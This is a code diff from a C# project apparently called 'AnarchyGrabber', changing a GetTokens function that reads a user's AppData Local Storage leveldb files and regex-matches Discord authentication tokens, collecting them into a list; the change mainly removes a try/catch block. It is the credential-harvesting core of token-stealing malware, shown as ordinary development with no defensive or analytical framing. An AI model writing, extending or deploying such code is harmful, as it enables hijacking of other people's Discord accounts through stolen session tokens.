@@ -10,23 +10,21 @@ namespace AnarchyGrabber
     {
         public static List<string> GetTokens(string dir, bool checkLogs = false)
         {
+            DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+                                                      + @"\AppData\"
+                                                      + dir
+                                                      + @"\Local Storage\leveldb");
+
+
             List<string> tokens = new List<string>();
 
-            try
-            {
-                DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) 
-                                                          + @"\AppData\" 
-                                                          + dir 
-                                                          + @"\Local Storage\leveldb");
 
-                foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
-                {
-                    //looks for discord token patterns (yes my regex is shit shut up)
-                    foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]"))
-                            tokens.Add(match.Value);
-                }
+            foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
+            {
+                //looks for discord token patterns (yes my regex is shit shut up)
+                foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]"))
+                    tokens.Add(match.Value);
             }
-            catch { }
 
             tokens = tokens.Distinct().ToList();
 
